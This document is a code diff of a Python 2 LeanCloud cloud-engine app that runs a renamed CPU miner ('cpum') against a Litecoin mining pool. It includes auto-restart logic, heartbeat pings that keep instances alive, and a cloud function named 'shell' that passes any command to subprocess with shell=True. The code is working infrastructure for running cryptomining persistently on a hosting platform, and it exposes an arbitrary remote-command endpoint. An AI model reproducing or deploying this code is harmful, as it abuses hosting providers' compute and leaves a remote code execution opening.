@@ -22,6 +22,23 @@ str_setup = 'chmod +x cpum'
 
 #str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && ls -l'
 ENGNIE_RESTARTED = True
+SUBPROCESS_RUNNING = False
+
+def Shell( cmd, **params ):
+	print 'shell:',cmd
+	result = subprocess.Popen(
+		#[ "ping 127.0.0.1" ],
+		#[ "find /usr" ],
+		[ cmd ],
+		shell=True,
+		stdout=subprocess.PIPE,
+		stderr=subprocess.PIPE
+	)
+
+	result.wait() # 等待字进程结束( 等待shell命令结束 )
+	print result.returncode
+	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
+	return result.returncode
 
 @engine.define( 'cpuinfo' )
 def cpu_info():
@@ -71,23 +88,8 @@ def cpu_info():
 
 
 
-@engine.define( 'shell' )
-# 调试 {'cmd':'ls -l' }
-def Shell( cmd, **params ):
-	print 'shell:',cmd
-	result = subprocess.Popen(
-		#[ "ping 127.0.0.1" ],
-		#[ "find /usr" ],
-		[ cmd ],
-		shell=True,
-		stdout=subprocess.PIPE,
-		stderr=subprocess.PIPE
-	)
 
-	result.wait() # 等待字进程结束( 等待shell命令结束 )
-	print result.returncode
-	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
-	return result.returncode
+
 
 #上传运行一次
 # 15 5/15 9-23 * * ?
@@ -118,32 +120,50 @@ def cmd_cpulimit(**params):
 	OutputShell('cpulimit -l 40')
 	return True
 
+def Mine():
+	#str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --threads=4 --user=waylite'
+	str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --user=waylite'
+	str_cmd = 'PATH="$PATH:/media/azhu/sda6/LeanCloud/Wayho_Lean/mlite01" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --user=waylite'
 
-#半小时运行一次
-# 15 5/15 9-23 * * ?
+	print 'Mine:Once'
+	OutputShell(str_setup)
+	time.sleep(1)
+	WORK_ID = os.environ.get( 'WORK_ID' )
+	str_cmd += ' --userpass waylite.' + WORK_ID + ':x'
+	OutputShell(str_cmd)
+
+# 1m运行一次
+# 60
 @engine.define( 'enginerestart' )
 def EngineRestart(**params):
 	global ENGNIE_RESTARTED
-	str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443  --algo=scrypt --threads=4 --user=waylite'
-	if(ENGNIE_RESTARTED):
-		print 'EngineRestart:Once'
+	if (ENGNIE_RESTARTED):
 		ENGNIE_RESTARTED = False
-		OutputShell(str_setup)
-		time.sleep(2)
-		WORK_ID = os.environ.get( 'WORK_ID' )
-		str_cmd += ' --userpass waylite.' + WORK_ID + ':x'
-		OutputShell(str_cmd)
+		Mine()
+		return True
 	else:
-		pass
-		#print 'Engine Running:Pass'
+		if(SUBPROCESS_RUNNING):
+			print '*',
+			return False
+		else:
+			print 'SUBPROCESS not in run,wait 45s'
+			time.sleep( 45 )
+			if (SUBPROCESS_RUNNING):
+				print '*',
+				return False
+			else:
+				Mine()
+
 	return True
 
 #半小时运行一次
 # 15 5/15 9-23 * * ?
 @engine.define( 'heart' )
 def Heart(**params):
-	print 'Heart',
-	response = requests.get( "http://mlite01.leanapp.cn/heart" )
+	global SUBPROCESS_RUNNING
+	SUBPROCESS_RUNNING = False
+	WORK_ID = os.environ.get( 'WORK_ID' )
+	response = requests.get( "http://mlite0" + WORK_ID + ".leanapp.cn/heart" )
 	print '..Heart End'
 	return True
 
@@ -157,7 +177,10 @@ def Heart_herokuapp(**params):
 	print '..Heart End'
 	return True
 
+@engine.define( 'shell' )
+# 调试 {'cmd':'ls -l' }
 def OutputShell( cmd, **params ):
+	global SUBPROCESS_RUNNING
 	print 'shell:',cmd
 	result = subprocess.Popen(
 		#[ "ping 127.0.0.1" ],
@@ -177,6 +200,7 @@ def OutputShell( cmd, **params ):
 			if len( readbuf_msg ) == 0:
 				select_rfds.remove( result.stdout )     #result.stdout需要remove，否则进程不会结束
 			else:
+				SUBPROCESS_RUNNING = True
 				print readbuf_msg,
 
 		if result.stderr in rfds:
